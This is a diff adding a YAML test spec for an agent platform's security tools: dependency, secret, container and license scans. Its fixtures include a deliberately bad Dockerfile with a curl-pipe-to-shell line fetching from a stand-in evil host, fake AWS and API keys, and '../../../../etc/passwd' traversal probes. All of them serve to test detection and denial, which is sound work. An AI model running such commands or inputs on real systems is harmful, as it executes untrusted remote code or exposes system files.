@@ -1,0 +1,335 @@
+# Per-tool adversarial spec — security.* family (scan_dependencies, scan_secrets,
+# scan_container, license_check).
+#
+# Format/semantics identical to specs/fs.yaml: capability cases exercise real
+# behavior against the polyglot fixture, adversarial cases probe malformed/edge
+# input, governance cases must be denied. A divergence from `expect` is a BUG.
+#
+# Environment facts that drive the expectations (verified against
+# dependency_tools.go, secrets_tools.go, container_scan_tools.go,
+# license_tools.go and swe_helpers.go):
+#   * NONE of these tools is approval-gated (side_effects: none, no
+#     requires_approval in the catalog), so governance = path traversal only.
+#     Every tool has policy.path_fields on `path` -> traversal is policy_denied.
+#   * Project detection is WORKSPACE-ROOT based (detectProjectTypeForSession):
+#     the fixture has go.mod at the root -> project_type is ALWAYS "go", even
+#     when `path` points at the node/python subprojects. The `path` arg only
+#     moves the command cwd. For go, `go list -m all` then walks UP to the
+#     enclosing module, so scanning "web" still reports the root go module —
+#     the path is effectively ignored (latent bug, pinned below).
+#   * The fixture go.mod declares NO dependencies -> the inventory is exactly
+#     one entry: the module itself, version "unknown", license "unknown".
+#   * Handler-level validation (JSON type mismatch, bad enum) returns
+#     {status: failed, error_code: invalid_argument} — never denied.
+#   * Numeric knobs are clamped (clampInt / manual bounds), never rejected:
+#     out-of-range values silently succeed.
+#   * scan_secrets: rg (fallback grep) exit 1 = clean scan (succeeded, zero
+#     findings); exit >1 (e.g. nonexistent path) = execution_failed.
+#   * scan_container: trivy IS on the fat runner, but the handler NEVER hard-
+#     fails on scan trouble: trivy error -> Dockerfile-heuristic fallback;
+#     trivy success with 0 findings on fs scans -> heuristic secondary signal.
+#     Both paths converge on scanner="heuristic-dockerfile" and exit_code 0
+#     for a directory containing only a Dockerfile (no lockfiles/secrets), so
+#     the seeded-bad-Dockerfile expectations are deterministic either way.
+#   * license_check: a policy FAIL is a SUCCEEDED invocation (exit_code 1,
+#     status "fail", no domain error) — same contract as quality.gate.
+tools:
+  - tool: security.scan_dependencies
+    cases:
+      # ── capability ──────────────────────────────────────────────────────
+      - name: scan_go_module_inventory
+        category: capability
+        # Root go.mod, no requires -> exactly the module itself, version and
+        # license "unknown".
+        args: {}
+        expect:
+          status: succeeded
+          output:
+            project_type: "go"
+            command: ["go", "list", "-m", "all"]
+            dependencies_count: 1
+            dependencies.0.name: "github.com/underpass-ai/e2e-fixture"
+            dependencies.0.version: "unknown"
+            dependencies.0.ecosystem: "go"
+            dependencies.0.license: "unknown"
+            truncated: false
+            scanner: "workspace-inventory-v1"
+            exit_code: 0
+          output_present: [output]
+      - name: scan_node_subdir_still_reports_go
+        category: capability
+        # LATENT BUG pinned: path only moves the cwd; detection stays at the
+        # workspace root ("go"), and `go list -m all` in web/ walks UP to the
+        # root module. Scanning the node subproject reports the go module.
+        args: {path: "web"}
+        expect:
+          status: succeeded
+          output:
+            project_type: "go"
+            dependencies_count: 1
+            dependencies.0.name: "github.com/underpass-ai/e2e-fixture"
+      # ── adversarial ─────────────────────────────────────────────────────
+      - name: negative_max_dependencies_clamped
+        category: adversarial
+        # clampInt(-3, 1, 5000, 500) -> 1; the single module entry still fits,
+        # so the scan succeeds untruncated (no rejection of out-of-range input).
+        args: {max_dependencies: -3}
+        expect:
+          status: succeeded
+          output: {dependencies_count: 1, truncated: false}
+      - name: max_dependencies_type_mismatch
+        category: adversarial
+        # max_dependencies must be an integer; a string fails json.Unmarshal.
+        args: {max_dependencies: "lots"}
+        expect: {status: failed, error_code: invalid_argument}
+      # ── governance ──────────────────────────────────────────────────────
+      - name: traversal_path_denied
+        category: governance
+        args: {path: "../../../../etc/passwd"}
+        expect: {status: denied, error_code: policy_denied}
+
+  - tool: security.scan_secrets
+    cases:
+      # ── capability ──────────────────────────────────────────────────────
+      - name: detects_seeded_aws_key_and_api_key
+        category: capability
+        # Seed a REAL leak: line 1 matches AKIA[0-9A-Z]{16}, line 2 matches the
+        # generic quoted api_key pattern. Scan is confined to e2e/sec so no
+        # other spec's files can pollute the count.
+        setup:
+          - tool: fs.write_file
+            approved: true
+            args:
+              path: "e2e/sec/leaky.txt"
+              create_parents: true
+              content: |
+                aws_access_key_id = AKIAIOSFODNN7EXAMPLE
+                api_key = "sk-live-abcdef123456789"
+        args: {path: "e2e/sec"}
+        expect:
+          status: succeeded
+          output:
+            findings_count: 2
+            findings.0.path: "e2e/sec/leaky.txt"
+            findings.0.line: 1
+            findings.1.line: 2
+            truncated: false
+          output_present: [findings, output]
+      - name: clean_directory_zero_findings
+        category: capability
+        # cmd/ holds only the fixture Go sources; rg exits 1 (no match) which
+        # the handler treats as a successful clean scan, NOT an error.
+        args: {path: "cmd"}
+        expect:
+          status: succeeded
+          output: {findings_count: 0, truncated: false}
+      - name: max_results_one_truncates
+        category: capability
+        # Same seeded 2-leak file; max_results:1 caps the scan and flips
+        # truncated (len(findings) >= max_results).
+        setup:
+          - tool: fs.write_file
+            approved: true
+            args:
+              path: "e2e/sec/leaky.txt"
+              create_parents: true
+              content: |
+                aws_access_key_id = AKIAIOSFODNN7EXAMPLE
+                api_key = "sk-live-abcdef123456789"
+        args: {path: "e2e/sec", max_results: 1}
+        expect:
+          status: succeeded
+          output: {findings_count: 1, truncated: true}
+      # ── adversarial ─────────────────────────────────────────────────────
+      - name: max_results_type_mismatch
+        category: adversarial
+        args: {max_results: "many"}
+        expect: {status: failed, error_code: invalid_argument}
+      - name: nonexistent_path_fails
+        category: adversarial
+        # In-workspace but missing dir: rg/grep exit 2 -> toToolError. The
+        # handler surfaces a raw execution_failed rather than not_found.
+        args: {path: "no/such/dir"}
+        expect: {status: failed, error_code_in: [execution_failed, not_found]}
+      # ── governance ──────────────────────────────────────────────────────
+      - name: traversal_path_denied
+        category: governance
+        args: {path: "../../../../etc/passwd"}
+        expect: {status: denied, error_code: policy_denied}
+
+  - tool: security.scan_container
+    cases:
+      # ── capability ──────────────────────────────────────────────────────
+      - name: fs_scan_default_workspace
+        category: capability
+        # Default "." fs scan. Whether trivy has a vuln DB or not, the handler
+        # converges on a succeeded invocation with exit_code 0 (trivy pass,
+        # heuristic fallback, or heuristic secondary signal). scanner/findings
+        # depend on DB availability, so only structural fields are pinned.
+        args: {}
+        expect:
+          status: succeeded
+          output:
+            target: "."
+            path: "."
+            image_ref: ""
+            severity_threshold: "medium"
+            exit_code: 0
+          output_present: [scanner, findings, findings_count, severity_counts, command, output]
+      - name: seeded_bad_dockerfile_medium_findings
+        category: capability
+        # e2e/scan contains ONLY a deliberately bad Dockerfile (no lockfiles,
+        # no secrets), so trivy reports nothing and the Dockerfile heuristics
+        # provide the findings deterministically: unpinned base (medium),
+        # pipe-to-shell (high), chmod 777 (medium), missing USER (medium);
+        # the ADD rule (low) is filtered by the medium threshold.
+        setup:
+          - tool: fs.write_file
+            approved: true
+            args:
+              path: "e2e/scan/Dockerfile.bad"
+              create_parents: true
+              content: |
+                FROM ubuntu:latest
+                ADD app.tar.gz /opt/app
+                RUN curl http://evil.example.com/install.sh | sh
+                RUN chmod 777 /opt/app
+        args: {path: "e2e/scan", severity_threshold: "medium"}
+        expect:
+          status: succeeded
+          output:
+            scanner: "heuristic-dockerfile"
+            findings_count: 4
+            findings.0.id: "dockerfile.unpinned_base_image"
+            findings.0.severity: "medium"
+            findings.0.line: 1
+            severity_counts.high: 1
+            severity_counts.medium: 3
+            severity_counts.critical: 0
+            severity_counts.low: 0
+            truncated: false
+            exit_code: 0
+      - name: seeded_bad_dockerfile_high_threshold
+        category: capability
+        # threshold high keeps only the pipe-to-shell rule; the medium rules
+        # (including the implicit missing-USER check) are filtered out.
+        setup:
+          - tool: fs.write_file
+            approved: true
+            args:
+              path: "e2e/scan/Dockerfile.bad"
+              create_parents: true
+              content: |
+                FROM ubuntu:latest
+                ADD app.tar.gz /opt/app
+                RUN curl http://evil.example.com/install.sh | sh
+                RUN chmod 777 /opt/app
+        args: {path: "e2e/scan", severity_threshold: "high"}
+        expect:
+          status: succeeded
+          output:
+            findings_count: 1
+            findings.0.id: "dockerfile.pipe_to_shell"
+            findings.0.severity: "high"
+            severity_counts.high: 1
+            severity_counts.medium: 0
+      # ── adversarial ─────────────────────────────────────────────────────
+      - name: bogus_image_ref_degrades_to_heuristics
+        category: adversarial
+        # LATENT BUG pinned: an unpullable image_ref does NOT fail. The trivy
+        # image error triggers the Dockerfile-heuristic fallback over the
+        # WORKSPACE path and the invocation SUCCEEDS with target set to the
+        # image — the findings have nothing to do with the requested image.
+        args: {image_ref: "no.such.registry.invalid/acme/ghost:1.2.3"}
+        expect:
+          status: succeeded
+          output:
+            scanner: "heuristic-dockerfile"
+            target: "no.such.registry.invalid/acme/ghost:1.2.3"
+            image_ref: "no.such.registry.invalid/acme/ghost:1.2.3"
+            exit_code: 0
+          output_present: [findings, findings_count, severity_counts]
+      - name: invalid_severity_threshold
+        category: adversarial
+        # Enum is enforced in the handler (normalizeSeverityThreshold), not the
+        # schema: anything outside low/medium/high/critical is rejected.
+        args: {severity_threshold: "banana"}
+        expect: {status: failed, error_code: invalid_argument}
+      # ── governance ──────────────────────────────────────────────────────
+      - name: traversal_path_denied
+        category: governance
+        args: {path: "../../../../etc/passwd"}
+        expect: {status: denied, error_code: policy_denied}
+
+  - tool: security.license_check
+    cases:
+      # ── capability ──────────────────────────────────────────────────────
+      - name: default_warn_on_unknown_go_license
+        category: capability
+        # go path has NO license enrichment -> the single module entry stays
+        # "unknown"; default unknown_policy=warn yields status "warn" with no
+        # violations and exit_code 0.
+        args: {}
+        expect:
+          status: succeeded
+          output:
+            project_type: "go"
+            command: ["go", "list", "-m", "all"]
+            dependencies_checked: 1
+            allowed_count: 0
+            denied_count: 0
+            unknown_count: 1
+            unknown_policy: "warn"
+            status: "warn"
+            violations: []
+            exit_code: 0
+            truncated: false
+          output_present: [dependencies, output]
+      - name: unknown_policy_deny_fails_but_succeeds
+        category: capability
+        # KEY contract (same as quality.gate): a license-policy FAIL is a
+        # SUCCEEDED invocation with status "fail" + exit_code 1. The unknown
+        # module lands in violations, yet denied_count stays 0 (unknown_count
+        # carries it) — counts and violations are intentionally asymmetric.
+        args: {unknown_policy: "deny"}
+        expect:
+          status: succeeded
+          output:
+            status: "fail"
+            exit_code: 1
+            unknown_count: 1
+            denied_count: 0
+            violations.0.name: "github.com/underpass-ai/e2e-fixture"
+            violations.0.license: "unknown"
+            violations.0.reason: "unknown license is denied by policy"
+      - name: denied_licenses_token_normalization
+        category: capability
+        # Policy tokens are split on comma/space, uppercased, _ -> -, deduped
+        # and sorted: ["gpl_3.0, mit"] echoes back as ["GPL-3.0","MIT"]. The
+        # unknown module matches neither -> still warn.
+        args: {denied_licenses: ["gpl_3.0, mit"]}
+        expect:
+          status: succeeded
+          output:
+            denied_licenses: ["GPL-3.0", "MIT"]
+            denied_count: 0
+            unknown_count: 1
+            status: "warn"
+            exit_code: 0
+      # ── adversarial ─────────────────────────────────────────────────────
+      - name: invalid_unknown_policy
+        category: adversarial
+        # Enum enforced in the handler: only warn|deny are accepted.
+        args: {unknown_policy: "block"}
+        expect: {status: failed, error_code: invalid_argument}
+      - name: allowed_licenses_type_mismatch
+        category: adversarial
+        # allowed_licenses must be an array of strings; a bare string fails
+        # json.Unmarshal.
+        args: {allowed_licenses: "MIT"}
+        expect: {status: failed, error_code: invalid_argument}
+      # ── governance ──────────────────────────────────────────────────────
+      - name: traversal_path_denied
+        category: governance
+        args: {path: "../../../../etc/passwd"}
+        expect: {status: denied, error_code: policy_denied}
